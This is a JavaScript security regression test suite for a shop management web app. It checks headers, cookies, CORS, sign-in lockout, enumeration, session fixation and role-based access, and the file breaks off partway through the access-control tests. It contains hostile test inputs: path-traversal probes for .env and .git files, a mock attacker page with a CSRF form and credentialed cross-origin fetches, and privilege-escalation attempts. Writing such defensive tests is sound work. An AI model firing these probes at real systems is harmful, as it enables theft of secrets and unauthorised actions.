// Security / vulnerability tests, organised by the OWASP Top 10 (2021).
//
//   node --env-file=.env scripts/test-db.mjs 11-security        (rebuild first if app code changed)
//
// Unlike the feature tests, every test here asserts the SECURE behaviour: it PASSES when
// the defence holds and FAILS when a weakness is (back) in the app, with the evidence in
// the failure message. All of them pass today, so this file is part of the default run.
// A red test here is a security regression, not a broken test.
//
// Everything runs against the throw-away test database and the test servers started by
// scripts/test-db.mjs (a normal one, one with the database down, one with the sign-in rate
// limit on). A tiny "attacker" web server on another origin (127.0.0.1) is used for the
// real-browser cross-site tests.
import { test, describe, before, after } from "node:test";
import assert from "node:assert/strict";
import http from "node:http";
import { readFileSync, readdirSync, statSync } from "node:fs";
import path from "node:path";
import { spawnSync } from "node:child_process";
import {
  api,
  BASE,
  DEAD_DB_BASE,
  THROTTLED_BASE,
  Client,
  OWNER,
  STAFF_PASSWORD,
  asOwner,
  createStaff,
  download,
  launchBrowser,
  loadStores,
  log,
  modal,
  nav,
  one,
  parseCsv,
  pool,
  roleIds,
  row,
  shopFixture,
  stores,
} from "./helpers.mjs";

const ROOT = path.join(import.meta.dirname, "..");
const appUrl = new URL(BASE);

/* ------------------------------------------------------------- utilities */

const median = (xs) => [...xs].sort((a, b) => a - b)[Math.floor(xs.length / 2)];
async function timed(fn) {
  const t = performance.now();
  const value = await fn();
  return { value, ms: Math.round(performance.now() - t) };
}
const tally = (xs) => xs.reduce((o, x) => ((o[x] = (o[x] || 0) + 1), o), {});

/** A raw HTTP request whose path is sent exactly as given (no URL normalisation). */
function raw(method, rawPath, { headers = {}, body } = {}) {
  return new Promise((resolve, reject) => {
    const req = http.request(
      { host: appUrl.hostname, port: appUrl.port, method, path: rawPath, headers },
      (res) => {
        const chunks = [];
        res.on("data", (c) => chunks.push(c));
        res.on("end", () =>
          resolve({ status: res.statusCode, headers: res.headers, text: Buffer.concat(chunks).toString("utf8") }),
        );
      },
    );
    req.on("error", reject);
    req.setTimeout(20000, () => req.destroy(new Error(`timeout: ${method} ${rawPath}`)));
    if (body) req.write(body);
    req.end();
  });
}

/** Like raw(), but follows redirects (like a browser) and reports the whole chain. */
async function rawFollow(rawPath, hops = 4) {
  const chain = [];
  let current = rawPath;
  for (let i = 0; i <= hops; i++) {
    const r = await raw("GET", current);
    chain.push(`${r.status}${r.headers.location ? ` → ${r.headers.location}` : ""}`);
    if (r.status >= 300 && r.status < 400 && r.headers.location) {
      const next = new URL(r.headers.location, BASE);
      current = next.pathname + next.search;
      continue;
    }
    return { ...r, chain };
  }
  return { status: 599, headers: {}, text: "", chain };
}

/** A signed-in staff client for a role id (createStaff only knows the built-in role keys). */
async function staffWithRoleId(admin, username, roleId) {
  const r = await admin.post("/api/user", { username, name: username, roleIds: [roleId] });
  assert.equal(r.status, 200, `create ${username}: ${JSON.stringify(r.body)}`);
  const c = await new Client().login(username, r.body.temporaryPassword);
  const p = await c.post("/api/auth/password", {
    currentPassword: r.body.temporaryPassword,
    newPassword: STAFF_PASSWORD,
  });
  assert.equal(p.status, 200, `password change ${username}: ${JSON.stringify(p.body)}`);
  c.username = username;
  c.userId = r.body.id;
  return c;
}

const unlock = (username) =>
  pool.query("UPDATE auth_users SET failed_login_count = 0, locked_until = NULL WHERE username = ?", [username]);

/** A small web server on a different origin than the app, playing the attacker's website. */
function startAttacker() {
  const server = http.createServer((req, res) => {
    const { pathname } = new URL(req.url, "http://x");
    const page = (body) => {
      res.writeHead(200, { "content-type": "text/html; charset=utf-8" });
      res.end(`<!doctype html><meta charset="utf-8">${body}`);
    };
    if (pathname === "/frame") return page(`<iframe id="victim" src="${BASE}/" width="1000" height="700"></iframe>`);
    if (pathname === "/csrf-form")
      return page(
        `<form id="f" method="POST" action="${BASE}/api/learnex/reset" enctype="text/plain">` +
          `<input name='{"x":"' value='"}'></form><script>document.getElementById("f").submit()</script>`,
      );
    if (pathname === "/xhr")
      return page(`<pre id="out">running</pre><script>
        (async () => {
          const out = {};
          const attempts = [
            ["readData", "${BASE}/api/learnex/data", { credentials: "include" }],
            ["readMe", "${BASE}/api/auth/me", { credentials: "include" }],
            ["postResetText", "${BASE}/api/learnex/reset", { method: "POST", credentials: "include", headers: { "content-type": "text/plain" }, body: "{}" }],
            ["postResetJson", "${BASE}/api/learnex/reset", { method: "POST", credentials: "include", headers: { "content-type": "application/json" }, body: "{}" }],
          ];
          for (const [name, url, init] of attempts) {
            try { const r = await fetch(url, init); out[name] = { status: r.status, text: (await r.text()).slice(0, 160) }; }
            catch (e) { out[name] = { blocked: String(e.message || e) }; }
          }
          window.__results = out;
          document.getElementById("out").textContent = JSON.stringify(out);
        })();
      </script>`);
    res.writeHead(404);
    res.end();
  });
  return new Promise((resolve) =>
    server.listen(0, "127.0.0.1", () => resolve({ server, origin: `http://127.0.0.1:${server.address().port}` })),
  );
}

/* --------------------------------------------------------------- fixtures */

let browser, attacker;
let owner, admin, cashier, stocker, accountant, nobody;
let ids; // role ids by key

before(async () => {
  owner = await asOwner();
  await loadStores(shopFixture());
  ids = await roleIds();
  admin = await createStaff(owner, { username: "sec-admin", name: "Sec Admin", roles: ["administrator"] });
  cashier = await createStaff(owner, { username: "sec-cashier", name: "Sec Cashier", roles: ["sales"] });
  stocker = await createStaff(owner, { username: "sec-stock", name: "Sec Stock", roles: ["inventory"] });
  accountant = await createStaff(owner, { username: "sec-acct", name: "Sec Accountant", roles: ["accountant"] });
  const empty = await owner.post("/api/roles", { name: "No permissions", description: "", permissions: [] });
  nobody = await staffWithRoleId(owner, "sec-nobody", empty.body.id);
  browser = await launchBrowser();
  attacker = await startAttacker();
});
after(async () => {
  await browser?.close();
  attacker?.server.close();
  await pool.end();
});

/* ================================================================== */
/* A. Transport, headers, exposure (A02 Cryptographic failures,        */
/*    A05 Security misconfiguration)                                    */
/* ================================================================== */

describe("A. Headers, transport and exposure", () => {
  let pageRes, apiRes;
  before(async () => {
    pageRes = await fetch(BASE + "/");
    await pageRes.text();
    apiRes = await fetch(BASE + "/api/auth/me");
    await apiRes.text();
  });
  const hdr = (res, name) => res.headers.get(name);

  test("SEC-1 [A05] pages and API answers forbid MIME sniffing (X-Content-Type-Options: nosniff)", () => {
    const got = { page: hdr(pageRes, "x-content-type-options"), api: hdr(apiRes, "x-content-type-options") };
    log(JSON.stringify(got));
    assert.deepEqual(got, { page: "nosniff", api: "nosniff" }, "header missing");
  });

  test("SEC-2 [A05] the app cannot be framed by another website (clickjacking) — header and real browser", async () => {
    const xfo = hdr(pageRes, "x-frame-options");
    const csp = hdr(pageRes, "content-security-policy") || "";
    const headerOk = /^(deny|sameorigin)$/i.test(xfo || "") || /frame-ancestors/i.test(csp);
    const ctx = await browser.newContext();
    const page = await ctx.newPage();
    await page.goto(attacker.origin + "/frame");
    await page.waitForTimeout(2500);
    const frame = page.frames().find((f) => f.url().startsWith(BASE));
    let loaded = false;
    if (frame) loaded = ((await frame.locator("body").innerText().catch(() => "")) || "").trim().length > 0;
    await ctx.close();
    log(`X-Frame-Options=${xfo}; CSP frame-ancestors=${/frame-ancestors/i.test(csp)}; app rendered inside attacker's iframe: ${loaded}`);
    assert.ok(headerOk && !loaded, `the app can be embedded in another site's iframe (rendered=${loaded}, X-Frame-Options=${xfo}, CSP=${csp || "none"})`);
  });

  test("SEC-3 [A05] a Content-Security-Policy limits where scripts, frames and objects can come from", () => {
    const csp = hdr(pageRes, "content-security-policy");
    log(`Content-Security-Policy: ${csp ?? "(none)"}`);
    assert.ok(csp && /(default-src|script-src)/i.test(csp) && /(frame-ancestors|object-src)/i.test(csp), "no Content-Security-Policy header");
  });

  test("SEC-4 [A05] Referrer-Policy is set", () => {
    const v = hdr(pageRes, "referrer-policy");
    log(`Referrer-Policy: ${v ?? "(none)"}`);
    assert.ok(v, "no Referrer-Policy header");
  });

  test("SEC-5 [A05] Permissions-Policy is set (camera, microphone, geolocation off)", () => {
    const v = hdr(pageRes, "permissions-policy");
    log(`Permissions-Policy: ${v ?? "(none)"}`);
    assert.ok(v, "no Permissions-Policy header");
  });

  test("SEC-6 [A05] the server does not announce its framework (no X-Powered-By)", () => {
    const v = hdr(pageRes, "x-powered-by");
    log(`X-Powered-By: ${v ?? "(none)"}`);
    assert.equal(v, null, `X-Powered-By: ${v}`);
  });

  test("SEC-7 [A02] HTTPS answers carry Strict-Transport-Security", async () => {
    const res = await fetch(BASE + "/", { headers: { "x-forwarded-proto": "https" } });
    await res.text();
    const v = res.headers.get("strict-transport-security");
    log(`Strict-Transport-Security (request marked as HTTPS): ${v ?? "(none)"}`);
    assert.ok(v && /max-age=\d{6,}/.test(v), "no HSTS header");
  });

  test("SEC-8 [A02/A07] the session cookie is HttpOnly, SameSite, host-only; over HTTPS it is Secure and __Host- prefixed", async () => {
    const plain = await new Client().post("/api/auth/login", { username: "sec-cashier", password: STAFF_PASSWORD });
    const secure = await new Client().post(
      "/api/auth/login",
      { username: "sec-cashier", password: STAFF_PASSWORD },
      { "x-forwarded-proto": "https" },
    );
    const p = plain.setCookie.find((c) => c.includes("learnex_session")) || "";
    const s = secure.setCookie.find((c) => c.includes("learnex_session")) || "";
    log("plain  :", p.replace(/=[^;]+/, "=<token>"));
    log("https  :", s.replace(/=[^;]+/, "=<token>"));
    assert.match(p, /HttpOnly/i, "HttpOnly missing");
    assert.match(p, /SameSite=(lax|strict)/i, "SameSite missing");
    assert.match(p, /Path=\//i);
    assert.doesNotMatch(p, /Domain=/i, "cookie shared with subdomains");
    assert.ok(s.startsWith("__Host-learnex_session="), "no __Host- prefix over HTTPS");
    assert.match(s, /;\s*Secure/i, "Secure missing over HTTPS");
    assert.doesNotMatch(s, /Domain=/i);
  });

  test("SEC-9 [A05] source, secrets, backups and dependency files are not downloadable (incl. Windows/encoded path traversal)", async () => {
    const paths = [
      "/.env", "/.env.local", "/.env.example", "/package.json", "/package-lock.json", "/next.config.ts",
      "/tsconfig.json", "/README.md", "/learnex-data.json", "/Backups/learnex_backup_2026-10-13.html",
      "/LEARNEX%20Printers.html", "/.git/config", "/.git/HEAD", "/db/migrations/002_auth.sql",
      "/scripts/db-setup.mjs", "/lib/server/db.ts", "/app/api/auth/login/route.ts", "/tests/helpers.mjs",
      "/.next/server/app/api/auth/login/route.js", "/_next/../.env", "/_next/static/../../.env",
      "/%2e%2e/.env", "/%2e%2e%2f.env", "/..%2f..%2f.env", "/_next/static/..%2f..%2f..%2f.env",
      "/_next/static/..%5c..%5c..%5c.env", "/_next/static/%2e%2e/%2e%2e/.env", "/..\\.env",
      "/_next/static/chunks/..\\..\\..\\.env", "/public/../.env", "/api/../.env", "/%00.env", "/.env%00.js",
      "/.ENV", "/_next/image?url=..%2f..%2f.env&w=64&q=75", "/_next/image?url=/../../.env&w=64&q=75",
      "/_next/static/..%5c..%5cpackage.json", "/_next/data/../../package.json",
    ];
    const sentinels = [/DATABASE_URL\s*=/, /AUTH_SETUP_CODE/, /"name":\s*"hashil"/, /mysql:\/\//, /scrypt\$/];
    const exposed = [];
    const errors = [];
    const redirected = [];
    for (const p of paths) {
      const r = await rawFollow(p);
      if (r.chain.length > 1) redirected.push(`${p} => ${r.chain.join(" ; ")}`);
      if (r.status >= 500) errors.push(`${p} -> ${r.status}`);
      if (r.status < 400 || sentinels.some((re) => re.test(r.text))) exposed.push(`${p} -> ${r.chain.join(" ; ")}`);
    }
    for (const line of redirected) log("redirect:", line);
    log(`${paths.length} paths probed (redirects followed); 5xx on: ${errors.join(", ") || "none"}`);
    assert.deepEqual(exposed, [], `reachable: ${exposed.join("; ")}`);
  });

  test("SEC-10 [A05] no source maps and no secret values in the browser bundle (.next/static)", () => {
    const secrets = ["AUTH_SETUP_CODE", "JWT_SECRET", "MYSQL_ADMIN_URL"]
      .map((k) => [k, process.env[k]])
      .filter(([, v]) => v && v.length >= 8);
    const maps = [];
    const leaks = [];
    let files = 0;
    const walk = (dir) => {
      for (const name of readdirSync(dir)) {
        const full = path.join(dir, name);
        if (statSync(full).isDirectory()) walk(full);
        else {
          files++;
          if (name.endsWith(".map")) maps.push(path.relative(ROOT, full));
          if (/\.(js|css|html|json|txt)$/.test(name)) {
            const text = readFileSync(full, "utf8");
            for (const [k, v] of secrets) if (text.includes(v)) leaks.push(`${k} in ${path.relative(ROOT, full)}`);
            if (/mysql:\/\/[^"'\s]+@/.test(text)) leaks.push(`a MySQL URL in ${path.relative(ROOT, full)}`);
            if (/sourceMappingURL=/.test(text)) maps.push(`sourceMappingURL in ${path.relative(ROOT, full)}`);
          }
        }
      }
    };
    walk(path.join(ROOT, ".next", "static"));
    log(`${files} client files scanned for ${secrets.length} secret values, MySQL URLs and source maps`);
    assert.deepEqual({ maps, leaks }, { maps: [], leaks: [] });
  });

  test("SEC-11 [A05] CORS: another website gets no permission to read the API (simple and pre-flight requests)", async () => {
    const simple = await fetch(BASE + "/api/auth/me", { headers: { origin: "https://evil.example" } });
    await simple.text();
    const pre = await fetch(BASE + "/api/learnex/sync", {
      method: "OPTIONS",
      headers: {
        origin: "https://evil.example",
        "access-control-request-method": "POST",
        "access-control-request-headers": "content-type",
      },
    });
    await pre.text();
    const got = {
      simple: simple.headers.get("access-control-allow-origin"),
      preflight: pre.headers.get("access-control-allow-origin"),
      credentials: simple.headers.get("access-control-allow-credentials"),
    };
    log(JSON.stringify(got), `preflight status ${pre.status}`);
    assert.deepEqual(got, { simple: null, preflight: null, credentials: null });
  });

  test("SEC-12 [A05] unsupported HTTP methods are refused cleanly; TRACE is not echoed", async () => {
    const targets = ["/api/auth/login", "/api/auth/me", "/api/learnex/sync", "/api/user", "/api/audit"];
    const bad = [];
    for (const t of targets) {
      for (const m of ["PUT", "DELETE", "PATCH", "POST", "GET", "HEAD", "OPTIONS"]) {
        const r = await raw(m, t, { headers: { "content-type": "application/json", "content-length": "2" }, body: "{}" });
        if (r.status >= 500) bad.push(`${m} ${t} -> ${r.status}`);
      }
      const trace = await raw("TRACE", t);
      if (trace.status === 200) bad.push(`TRACE ${t} -> 200 (echo)`);
    }
    assert.deepEqual(bad, []);
  });

  test("SEC-13a [A05/A09] hostile sign-in input is answered 400/401 — never a database error (and is still logged)", async () => {
    const leaks = [];
    const check = (label, r) => {
      const text = JSON.stringify(r.body ?? "");
      if (r.status >= 500) leaks.push(`${label}: HTTP ${r.status} ${text.slice(0, 140)}`);
      else if (/ECONNREFUSED|ER_[A-Z_]+|Data too long|sql|stack|at .+\(.+:\d+/i.test(text))
        leaks.push(`${label}: ${text.slice(0, 140)}`);
    };
    const c = new Client();
    check("malformed JSON", await c.post("/api/auth/login", "{not json"));
    check("70 KB username", await c.post("/api/auth/login", { username: "u".repeat(70000), password: "x" }));
    check("array body", await c.post("/api/auth/login", "[]"));
    check("object-typed credentials", await c.post("/api/auth/login", { username: { a: 1 }, password: ["x"] }));
    log(`${leaks.length} leak(s):`, leaks.join(" || ") || "none");
    assert.deepEqual(leaks, []);
  });

  test("SEC-13b [A05] when the database is down, anonymous visitors are not told its address and port", async () => {
    const r = await new Client(DEAD_DB_BASE).get("/api/auth/me");
    log(`HTTP ${r.status}: ${JSON.stringify(r.body)}`);
    assert.doesNotMatch(JSON.stringify(r.body), /ECONNREFUSED|\d+\.\d+\.\d+\.\d+|::1|:\d{2,5}\b/, "the error shows the database host/port");
  });
});

/* ================================================================== */
/* B. Authentication (A07 Identification and authentication failures)  */
/* ================================================================== */

describe("B. Authentication", () => {
  test("SEC-14 [A07] the 5-attempt lockout holds when guesses arrive in parallel", async () => {
    await staffWithRoleId(owner, "sec-race", ids.sales);
    const N = 30;
    const wrongBurst = (n) =>
      Promise.all(
        Array.from({ length: n }, (_, i) =>
          new Client().post("/api/auth/login", { username: "sec-race", password: `wrong-guess-${i}` }),
        ),
      );
    const state = () => one("SELECT failed_login_count AS n, locked_until FROM auth_users WHERE username = 'sec-race'");
    // Burst 1: nothing but wrong passwords, all at the same moment.
    await unlock("sec-race");
    const wrong = await wrongBurst(N);
    const afterWrong = await state();
    const evaluated = wrong.filter((g) => g.status === 401).length;
    // Burst 2: the right password turns up while 29 wrong ones are still being processed.
    // (Sent after a short pause so it is certainly guess number 30, not one of the first five.)
    await unlock("sec-race");
    const pending = wrongBurst(N - 1);
    await new Promise((r) => setTimeout(r, 150));
    const right = await new Client().post("/api/auth/login", { username: "sec-race", password: STAFF_PASSWORD });
    await pending;
    await unlock("sec-race");
    const accepted = right.status === 200;
    log(`burst of ${N} wrong guesses -> ${JSON.stringify(tally(wrong.map((g) => g.status)))}; failed_login_count in DB = ${afterWrong.n}; locked = ${!!afterWrong.locked_until}`);
    log(`the right password sent after 29 wrong ones -> ${right.status} (${accepted ? "ACCEPTED" : "refused"})`);
    assert.ok(
      evaluated <= 5 && !accepted,
      `${evaluated} of ${N} parallel wrong guesses were checked against the password (limit is 5); the counter only reached ${afterWrong.n} and the account was ${afterWrong.locked_until ? "locked" : "NOT locked"}; a right password sent after 29 wrong ones ${accepted ? "got in" : "was refused"}`,
    );
  });

  test("SEC-14b [A04/A07] password spraying is slowed: 60 rapid sign-ins for 60 different usernames are mostly refused", async () => {
    // Server :3313 runs with the rate limit on (10 per client a minute); the normal test servers have it off.
    const N = 60;
    const { value: answers, ms } = await timed(() =>
      Promise.all(
        Array.from({ length: N }, (_, i) =>
          new Client(THROTTLED_BASE).post("/api/auth/login", { username: `spray-${i}`, password: "password1" }, { "x-forwarded-for": "10.9.9.9" }),
        ),
      ),
    );
    const statuses = tally(answers.map((a) => a.status));
    const processed = answers.filter((a) => a.status === 401).length;
    log(`${N} rapid sign-ins from one client -> ${JSON.stringify(statuses)} in ${ms} ms (only ${processed} were actually checked)`);
    assert.ok(answers.some((a) => a.status === 429), `no per-client throttling: all ${N} attempts were processed (${JSON.stringify(statuses)})`);
    assert.ok(processed <= 10, `${processed} attempts were checked; the limit is 10 a minute`);
  });

  test("SEC-14c [A04/A09] an anonymous client cannot park large amounts of its own data in the activity log via failed sign-ins", async () => {
    const marker = "AUDIT-FLOOD-" + "x".repeat(60000);
    const r = await new Client().post("/api/auth/login", { username: marker, password: "x" });
    const stored = await one("SELECT max(char_length(target)) AS n FROM audit_log WHERE action = 'auth.login_failed' AND target LIKE 'AUDIT-FLOOD-%'");
    log(`HTTP ${r.status}; longest attempted username stored in the log: ${stored.n ?? 0} characters`);
    assert.ok(!stored.n || stored.n <= 256, `the log keeps a ${stored.n}-character 'username' sent by an anonymous client (about 60 KB per request, no retention limit)`);
  });

  test("SEC-15 [A07] sign-in takes the same time for unknown and known usernames (no timing oracle)", async () => {
    const unknown = [];
    const known = [];
    for (let i = 0; i < 6; i++) {
      unknown.push((await timed(() => new Client().post("/api/auth/login", { username: `ghost-${i}`, password: "wrong-pass-1" }))).ms);
      known.push((await timed(() => new Client().post("/api/auth/login", { username: "sec-acct", password: `wrong-pass-${i}` }))).ms);
    }
    await unlock("sec-acct");
    const mu = median(unknown);
    const mk = median(known);
    log(`median unknown user ${mu} ms, known user ${mk} ms (difference ${Math.abs(mu - mk)} ms)`);
    assert.ok(Math.abs(mu - mk) <= Math.max(40, mu * 0.35), `timing differs: ${mu} ms vs ${mk} ms`);
  });

  test("SEC-16 [A07] a real account and an unknown name give the same answers attempt after attempt (no username enumeration)", async () => {
    await staffWithRoleId(owner, "sec-lock", ids.sales);
    // What an attacker does to test whether a name exists: keep guessing and watch for the lock.
    const answersFor = async (name) => {
      const out = [];
      for (let i = 0; i < 7; i++) {
        const r = await new Client().post("/api/auth/login", { username: name, password: `bad-${i}` });
        out.push({ status: r.status, error: r.body?.error });
      }
      return out;
    };
    const real = await answersFor("sec-lock");
    const ghost = await answersFor("sec-ghost-user");
    await unlock("sec-lock");
    log(`real account    -> ${real.map((a) => a.status).join(" ")}`);
    log(`unknown name    -> ${ghost.map((a) => a.status).join(" ")}`);
    assert.deepEqual(ghost, real, "the 'too many attempts' answer tells an attacker the username exists");
  });

  test("SEC-17 [A07] session fixation: an attacker-chosen cookie is never adopted; sign-in issues a new token", async () => {
    const chosen = "attacker-chosen-token-0123456789abcdefghijklmnopq";
    const victim = new Client();
    victim.cookie = `learnex_session=${chosen}`;
    const before = await victim.get("/api/auth/me");
    await victim.post("/api/auth/login", { username: "sec-stock", password: STAFF_PASSWORD });
    const after = victim.cookie.split("=")[1];
    const replay = new Client();
    replay.cookie = `learnex_session=${chosen}`;
    const replayMe = await replay.get("/api/auth/me");
    log(`before login signed-in=${!!before.body.user}; token replaced=${after !== chosen}; planted token afterwards signed-in=${!!replayMe.body.user}`);
    assert.equal(before.body.user, null);
    assert.notEqual(after, chosen);
    assert.equal(replayMe.body.user, null);
  });

  test("SEC-18 [A02] session tokens are long, random and unique (≥ 256 bits)", async () => {
    const tokens = [];
    for (let i = 0; i < 12; i++) {
      const c = new Client();
      await c.post("/api/auth/login", { username: "sec-stock", password: STAFF_PASSWORD });
      tokens.push(c.cookie.split("=")[1]);
    }
    const lengths = new Set(tokens.map((t) => t.length));
    log(`12 tokens, lengths ${[...lengths]}, sample ${tokens[0].slice(0, 6)}…, distinct ${new Set(tokens).size}`);
    assert.equal(new Set(tokens).size, tokens.length, "repeated token");
    assert.ok([...lengths].every((n) => n >= 43), "shorter than 256 bits of base64url");
    assert.ok(tokens.every((t) => /^[A-Za-z0-9_-]+$/.test(t) && new Set(t).size > 20), "low-variety token");
  });

  test("SEC-19 [A07] very common passwords are refused", async () => {
    const c = await staffWithRoleId(owner, "sec-pw", ids.sales);
    const common = ["password", "12345678", "qwertyui", "11111111", "password1", "iloveyou", "welcome1", "abcd1234"];
    const accepted = [];
    let current = STAFF_PASSWORD;
    for (const next of common) {
      const r = await c.post("/api/auth/password", { currentPassword: current, newPassword: next });
      if (r.status === 200) {
        accepted.push(next);
        current = next;
      }
    }
    log(`accepted ${accepted.length} of ${common.length}: ${accepted.join(", ") || "none"}`);
    assert.deepEqual(accepted, [], "the only rules are length 8–128 and 'not equal to the username'");
  });

  test("SEC-20 [A04/A05] the sign-in endpoint refuses very large request bodies instead of processing them", async () => {
    const small = await timed(() =>
      new Client().post("/api/auth/login", { username: "ghost", password: "p".repeat(100 * 1024) }),
    );
    const big = await timed(() =>
      new Client().post("/api/auth/login", `{"username":"ghost","password":"${"x".repeat(8 * 1024 * 1024)}"}`),
    );
    log(`100 KB password -> ${small.value.status} in ${small.ms} ms; 8 MB body -> ${big.value.status} in ${big.ms} ms`);
    assert.ok([400, 413, 431].includes(big.value.status), `an unauthenticated 8 MB body was read and processed (answer ${big.value.status} after ${big.ms} ms)`);
  });
});

/* ================================================================== */
/* C. Access control (A01 Broken access control)                       */
/* ================================================================== */

describe("C. Access control", () => {
  let victim;
  before(async () => {
    victim = await staffWithRoleId(owner, "sec-victim", ids.sales);
  });

  const ALL = ["owner", "administrator", "sales", "inventory", "accountant", "nobody"];
  const ADMINS = ["owner", "administrator"];
  const endpoints = () => [
    { name: "GET /api/learnex/data", call: (c) => c.get("/api/learnex/data"), allowed: ALL },
    { name: "POST /api/learnex/reset", call: (c) => c.post("/api/learnex/reset", {}), allowed: ["owner"], destructive: true },
    { name: "POST /api/learnex/import", call: (c) => c.post("/api/learnex/import", { stores: {} }), allowed: ADMINS },
    { name: "GET /api/user", call: (c) => c.get("/api/user"), allowed: ADMINS },
    { name: "POST /api/user", call: (c) => c.post("/api/user", {}), allowed: ADMINS },
    { name: "PATCH /api/user/:id", call: (c) => c.patch(`/api/user/${victim.userId}`, {}), allowed: ADMINS },
    { name: "PUT /api/user/:id/role", call: (c) => c.put(`/api/user/${victim.userId}/role`, {}), allowed: ADMINS },
    { name: "POST /api/user/:id/password", call: (c) => c.post(`/api/user/${victim.userId}/password`, {}), allowed: ADMINS },
    { name: "DELETE /api/user/:id/sessions", call: (c) => c.delete(`/api/user/${victim.userId}/sessions`), allowed: ADMINS },
    { name: "GET /api/roles", call: (c) => c.get("/api/roles"), allowed: ADMINS },
    { name: "POST /api/roles", call: (c) => c.post("/api/roles", {}), allowed: ADMINS },
    { name: "PATCH /api/roles/:id", call: (c) => c.patch("/api/roles/999999", {}), allowed: ADMINS },
    { name: "DELETE /api/roles/:id", call: (c) => c.delete("/api/roles/999999"), allowed: ADMINS },
    { name: "GET /api/audit", call: (c) => c.get("/api/audit"), allowed: ADMINS },
    { name: "POST /api/auth/password", call: (c) => c.post("/api/auth/password", { currentPassword: "wrong", newPassword: "whatever-123" }), allowed: ALL },
  ];

  test("SEC-21 [A01] role × endpoint matrix: every role can reach exactly what it should, anonymous reaches nothing", async () => {
    const personas = { owner, administrator: admin, sales: cashier, inventory: stocker, accountant, nobody };
    const wrong = [];
    let checks = 0;
    for (const ep of endpoints()) {
      const anon = await ep.call(new Client());
      checks++;
      if (anon.status !== 401) wrong.push(`anonymous ${ep.name}: ${anon.status} (want 401)`);
      for (const [name, client] of Object.entries(personas)) {
        const allowed = ep.allowed.includes(name);
        if (allowed && ep.destructive) continue; // never actually run the factory reset here
        const r = await ep.call(client);
        checks++;
        if (allowed && (r.status === 401 || r.status === 403 || r.status >= 500))
          wrong.push(`${name} ${ep.name}: ${r.status} (should be allowed)`);
        if (!allowed && r.status !== 403) wrong.push(`${name} ${ep.name}: ${r.status} (want 403)`);
      }
    }
    log(`${checks} role/endpoint checks, ${wrong.length} wrong`);
    assert.deepEqual(wrong, []);
  });

  test("SEC-22 [A01] a session that must still change its one-time password reaches nothing but sign-out and the password change", async () => {
    const made = await owner.post("/api/user", { username: "sec-pending", name: "Pending", roleIds: [ids.administrator] });
    const pending = await new Client().login("sec-pending", made.body.temporaryPassword);
    const blocked = [];
    for (const ep of endpoints()) {
      if (ep.name === "POST /api/auth/password") continue;
      const r = await ep.call(pending);
      if (r.status !== 403 || r.body?.code !== "password_change_required")
        blocked.push(`${ep.name}: ${r.status} ${r.body?.code ?? ""}`);
    }
    const me = await pending.get("/api/auth/me");
    const out = await pending.post("/api/auth/logout", {});
    log(`${blocked.length} endpoint(s) not blocked; /me -> ${me.status} mustChangePassword=${me.body.user?.mustChangePassword}; logout -> ${out.status}`);
    assert.deepEqual(blocked, []);
    assert.equal(me.body.user?.mustChangePassword, true);
    assert.equal(out.status, 200);
  });

  test("SEC-23 [A01] a role without 'Clear & factory reset' cannot wipe a whole module through /sync (replace, or deleting every record at once)", async () => {
    await loadStores(shopFixture());
    const entries = Array.from({ length: 12 }, (_, i) => ({ id: `TXN-SEC-${i + 1}`, date: "2026-02-01", desc: `Rent ${i}`, type: "Expense", category: "Rent", amount: 100 }));
    await owner.post("/api/learnex/sync", { changes: [{ store: "ledger", upserts: entries, order: entries.map((e) => e.id) }] });
    const count = async (t) => (await one(`SELECT count(*) AS n FROM ${t}`)).n;
    const before = { ledger: await count("ledger_entries"), products: await count("products") };
    const sync = (change) => cashier.post("/api/learnex/sync", { changes: [change] });
    const replaceLedger = await sync({ store: "ledger", replace: true, upserts: [], order: [] });
    const replaceProducts = await sync({ store: "products", replace: true, upserts: [], order: [] });
    const deleteAll = await sync({ store: "ledger", deletes: entries.map((e) => e.id) });
    const after = { ledger: await count("ledger_entries"), products: await count("products") };
    log(`Sales & POS role: replace ledger -> ${replaceLedger.status}; replace products -> ${replaceProducts.status}; delete all 12 ledger entries at once -> ${deleteAll.status}`);
    log(`rows: ledger ${before.ledger} -> ${after.ledger}, products ${before.products} -> ${after.products}`);
    await loadStores(shopFixture());
    assert.equal(replaceLedger.status, 403, `the cashier emptied the whole accounting ledger (${before.ledger} -> ${after.ledger} rows) without the data.reset permission`);
    assert.equal(replaceProducts.status, 403, "the cashier emptied the whole product list");
    assert.equal(deleteAll.status, 403, "the cashier deleted every ledger entry in one request");
    assert.deepEqual(after, before);
  });

  test("SEC-24 [A01] nobody can give themselves or anyone else more power than they hold", async () => {
    const ownerId = (await owner.get("/api/auth/me")).body.user.id;
    const um = await owner.post("/api/roles", { name: "Users only", description: "", permissions: ["users.manage"] });
    const rm = await owner.post("/api/roles", { name: "Roles only", description: "", permissions: ["roles.manage"] });
    const userMgr = await staffWithRoleId(owner, "sec-um", um.body.id);
    const roleMgr = await staffWithRoleId(owner, "sec-rm", rm.body.id);
    const adminPerms = (await owner.get("/api/roles")).body.roles.find((r) => r.key === "administrator").permissions;
    const attempts = [
      ["admin adds data.reset to the Administrator role", await admin.patch(`/api/roles/${ids.administrator}`, { name: "Administrator", description: "", permissions: [...adminPerms, "data.reset"] })],
      ["admin creates a user with the Owner role", await admin.post("/api/user", { username: "sec-esc-owner", name: "x", roleIds: [ids.owner] })],
      ["admin makes themselves Owner", await admin.put(`/api/user/${admin.userId}/role`, { roleIds: [ids.owner] })],
      ["admin demotes the Owner", await admin.put(`/api/user/${ownerId}/role`, { roleIds: [ids.sales] })],
      ["admin disables the Owner", await admin.patch(`/api/user/${ownerId}`, { status: "disabled" })],
      ["admin resets the Owner's password", await admin.post(`/api/user/${ownerId}/password`, {})],
      ["users-only manager hands out the Sales role", await userMgr.post("/api/user", { username: "sec-esc1", name: "x", roleIds: [ids.sales] })],
      ["roles-only manager builds a role with data.reset", await roleMgr.post("/api/roles", { name: "Power", description: "", permissions: ["roles.manage", "data.reset"] })],
      ["accountant creates a user", await accountant.post("/api/user", { username: "sec-esc2", name: "x", roleIds: [ids.sales] })],
      ["Owner role is edited by an administrator", await admin.patch(`/api/roles/${ids.owner}`, { name: "Owner", description: "", permissions: [] })],
    ];
    const allowed = attempts.filter(([, r]) => r.status !== 403).map(([what, r]) => `${what}: ${r.status}`);
    const fine = await userMgr.post("/api/user", { username: "sec-ok1", name: "x", roleIds: [um.body.id] });
    log(`${attempts.length} escalation attempts, ${allowed.length} not refused; same-level grant -> ${fine.status}`);
    assert.deepEqual(allowed, []);
    assert.equal(fine.status, 200, "granting a role you hold yourself must still work");
  });

